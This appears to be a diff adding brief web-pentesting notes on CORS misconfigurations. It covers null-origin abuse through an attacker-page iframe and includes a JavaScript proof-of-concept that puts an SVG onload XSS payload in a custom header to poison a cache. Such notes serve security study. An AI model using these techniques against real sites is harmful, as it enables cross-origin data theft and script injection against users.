@@ -1,0 +1,16 @@
+CORS misconfigurations can introduce a wide array of vulnerabilities in additional to just malicious resource accessing. 
+
+refer to this site for lots of great information and exploit techniques: https://book.hacktricks.xyz/pentesting-web/cors-bypass
+
+First off, be sure to always check null origin when testing for CORS misconfigs. If null works, on our attacker page we can create an iframe and put our script inside the iframe. All requests from an Iframe have a null origin so we would be able to maliciously access resources by loading them in the iframe. 
+-----------------------------------------------------------------------------------------------------------
+CORS can also help us to exploit cache poisoning if certain headers are not properly sanatized. for example if we can get the response from this request cached:
+<script>
+function gotcha() { location=url }
+var req = new XMLHttpRequest();
+url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
+req.onload = gotcha;
+req.open('get', url, true);
+req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
+req.send();
+</script>
